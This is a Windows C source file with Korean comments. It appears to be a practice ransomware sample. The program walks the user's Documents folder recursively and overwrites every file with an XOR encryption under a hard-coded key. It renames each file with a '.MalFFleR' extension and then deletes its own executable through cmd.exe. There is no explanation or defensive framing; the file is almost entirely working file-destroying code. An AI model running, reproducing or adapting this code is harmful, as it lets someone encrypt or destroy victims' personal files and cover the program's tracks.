#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <shlobj_core.h>
#include <combaseapi.h>
#include <fileapi.h>
#include <string.h>
#include <shlwapi.h>
#include <WinBase.h>

#define MAX_PATH 1000
#define buffersize 1024

#pragma comment (lib, "shlwapi.lib")

const BYTE xorKey[] = { 'M', 'a', 'l', 'F', 'F', 'l', 'e', 'R' };

void all_file_list(wchar_t* path);
void file_encrypt_xor(wchar_t* path);
void self_delete(void);

int main(void) {
	char* document_path = NULL;
	REFKNOWNFOLDERID ID = &FOLDERID_Documents;
	HRESULT document;

	document = SHGetKnownFolderPath(ID, 0, NULL, &document_path); //documents 폴더의 경로 가져오기
	if (document == 0) { //documents 폴더의 경로를 정상적으로 반환했다면 경로 출력
		all_file_list(document_path);
	}

	CoTaskMemFree(document_path); //할당된 메모리 해제
	
	self_delete();
}

void all_file_list(wchar_t* path) {
	wchar_t folder_path[MAX_PATH];
	WIN32_FIND_DATAW file_list;
	HANDLE result_handle;

	wcscpy_s(folder_path, MAX_PATH, path);
	wcscat_s(folder_path, MAX_PATH, L"\\*");
	result_handle = FindFirstFileW(folder_path, &file_list);

	do {
		if (wcscmp(file_list.cFileName, L".") != 0 && wcscmp(file_list.cFileName, L"..") != 0) {
			if (file_list.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { // 만약 폴더라면
				wchar_t tmp_path[MAX_PATH];
				wcscpy(tmp_path, path);
				wcscat(tmp_path, L"\\");
				wcscat(tmp_path, file_list.cFileName);
				all_file_list(tmp_path); // 재귀함수를 통해 자식 폴더의 파일들까지 모두 출력
			}
			else {
				wchar_t tmp_path[MAX_PATH];
				wcscpy_s(tmp_path, sizeof(tmp_path) / sizeof(wchar_t), path);
				wcscat_s(tmp_path, MAX_PATH, L"\\");
				wcscat_s(tmp_path, MAX_PATH, file_list.cFileName);
				file_encrypt_xor(tmp_path);
			}
		}
	} while (FindNextFileW(result_handle, &file_list) != 0);

	FindClose(result_handle);
}

void file_encrypt_xor(wchar_t* path) {
	LPVOID buffer[buffersize];
	DWORD BytesRead = 0;
	BYTE* data = NULL;
	DWORD totalBytesRead = 0;
	HANDLE CreateFile_result_read = CreateFileW(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	while (ReadFile(CreateFile_result_read, buffer, buffersize, &BytesRead, NULL) && BytesRead > 0) {
		data = (BYTE*)realloc(data, totalBytesRead + BytesRead);
		memcpy(data + totalBytesRead, buffer, BytesRead);
		totalBytesRead += BytesRead;
	}

	for (DWORD i = 0; i < totalBytesRead; i++) {
		data[i] ^= xorKey[i % 8]; // 8바이트 키를 순환하며 XOR 연산
	}

	CloseHandle(CreateFile_result_read); // 핸들을 닫음

	// 파일을 열 때 기존 내용을 삭제하고 덮어쓰기 위해 CREATE_ALWAYS 사용
	HANDLE CreateFile_result_write = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	BOOL result = WriteFile(CreateFile_result_write, data, totalBytesRead, NULL, NULL); // XOR로 암호화된 데이터 덮어쓰기

	free(data);
	CloseHandle(CreateFile_result_write); // 핸들을 닫음

	wchar_t newpath[10000]; // 확장자를 제외한 경로를 파싱할 변수
	wcscpy(newpath, path);
	wchar_t res[10000]; // 확장자를 바꿀 파일의 경로
	wcscpy(res, path);
	wchar_t* Ext = L".MalFFleR"; // 새로운 확장자
	wchar_t* context;

	if (newpath != NULL) {
		wcscat(newpath, Ext); // 새로운 확장자와 결합
		if (MoveFileW(res, newpath) != 0) { // 파일명 변경
			printf("Rename successful.\n");
		}
		else {
			perror("failed");
			printf("Rename failed.\n");
		}
	}
}


void self_delete(void) {
	char longPath[MAX_PATH];
	char shortPath[MAX_PATH];
	char strCommand[MAX_PATH + 8];

	// 현재 실행 중인 프로그램의 전체 경로 얻기
	DWORD length = GetModuleFileNameA(NULL, longPath, MAX_PATH);

	// 긴 파일 경로를 짧은 파일 경로로 변환
	DWORD shortPathLength = GetShortPathNameA(longPath, shortPath, MAX_PATH);

	// strcpy와 strcat을 사용하여 ANSI 문자열로 조합
	strcpy(strCommand, "/C del \"");
	strcat(strCommand, shortPath);
	strcat(strCommand, "\"");
	printf("%s\n", strCommand);

	HINSTANCE result = ShellExecuteA(NULL, "open", "cmd.exe", strCommand, NULL, SW_SHOW); // ANSI 문자열 사용
	printf("ShellExecuteA result: %p\n", result);

	if ((int)result > 32) {
		printf("파일 삭제 성공");
	}
	else if ((int)result <= 32) {
		printf("파일 삭제 실패");
	}

}